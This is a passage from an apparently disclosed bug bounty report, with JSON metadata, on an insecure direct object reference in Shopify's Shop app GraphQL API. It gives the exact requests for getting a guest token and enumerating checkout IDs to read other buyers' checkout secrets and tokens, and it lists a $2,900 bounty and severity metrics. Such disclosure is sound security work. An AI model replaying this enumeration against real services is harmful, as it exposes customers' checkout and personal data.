I've tried to create a new order on my own shops and when accessing the next ID (48909), it is still returning nothing. \n\nThat said, an explanation could either be that the **CheckoutStatus** query isn't used anymore thus only returning \"legacy\" orders or simply that the `id` property type has been changed from an Integer to an unpredictable one (i.e.: UUID).\n\n## Steps to reproduce\n\n.1. Make the following request\n\n```\nPOST /graphql HTTP/1.1\nHost: arrive-server.shopifycloud.com\nAccept: */*\nIf-None-Match: W/\"9753ba99576a2d7d3e7e0331a16c5b8e\"\nAccept-Language: en-ca\nContent-Type: application/json\nContent-Length: 230\nUser-Agent: Shop/2.15.4-release+377 ios/14.2\nConnection: close\n\n{\"operationName\":\"SignInAsGuest\",\"variables\":{},\"query\":\"mutation SignInAsGuest {\\n  signInAsGuest {\\n    authPayload {\\n      accessToken\\n      refreshToken\\n    }\\n    userErrors {\\n      field\\n      message\\n    }\\n  }\\n}\\n\"}\n```\n\n.2. From the returned payload, copy the `accessToken` value\n.3. Make the following request, by making sure to replace the {accessToken} placeholder with the previous step `accessToken` value\n\n```\nPOST /graphql HTTP/1.1\nHost: arrive-server.shopifycloud.com\nAccept: */*\nAuthorization: Bearer {accessToken}\nAccept-Encoding: gzip, deflate\nIf-None-Match: W/\"5ebae03d57dd7da47f078e11e3cfc0db\"\nAccept-Language: en-ca\nContent-Type: application/json\nContent-Length: 348\nUser-Agent: Shop/2.15.4-release+377 ios/14.2\nConnection: close\n\n{\"operationName\":\"CheckoutStatus\",\"variables\":{\"id\":\"48805\"  },\"query\":\"query CheckoutStatus($id: ID!) {\\n  checkoutStatus(id: $id) {\\n    ... on Checkout {\\n      id\\n      isShopPay\\n      payJsonParams\\n      status\\n      token\\n      url\\n      errorCode\\n    }\\n    ... on PollingInfo {\\n      waitMillis\\n      shouldRetry\\n    }\\n  }\\n}\\n\"}\n```\n\n**Response**\n```\n{\"data\":{\"checkoutStatus\":{\"id\":\"48805\",\"isShopPay\":true,\"payJsonParams\":\"{\\\"transaction_params\\\":\\\"checkout_secret=███\\\\u0026encrypted_params=███\\\\u0026locale=en\\\",\\\"token\\\":\\\"█████████\\\",\\\"origin\\\":\\\"shop_app\\\",\\\"shopify_domain\\\":\\\"sunday-citizen.myshopify.com\\\",\\\"checkout_token\\\":\\\"████████\\\"}\",\"status\":\"created\",\"token\":\"████████\",\"url\":\"https://shop.app/pay/session\",\"errorCode\":null}}}\n```\nBy looking at the returned response, specifically the `payJsonParams` property, it should then be possible to access the checkout page as the checkout secret and token are being returned. Therefore, we should get access to the buyer's email  and probably even more informations if the purchase has been completed.\n\n## Impact\n\nAccess to some checkout informations","bounty_amount":"2900.0","formatted_bounty":"$2,900","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":142,"voters":["battle_angel","tmo_sh","run_win","drsniper","ertugrul","mashoud1122","pleorqy","prakash142","badcracker","bombon","and 132 more..."],"severity":{"rating":"medium","score":4.6,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":37198,"asset_type":"OTHER","asset_identifier":"Shopify Developed Apps","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10181900,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug!
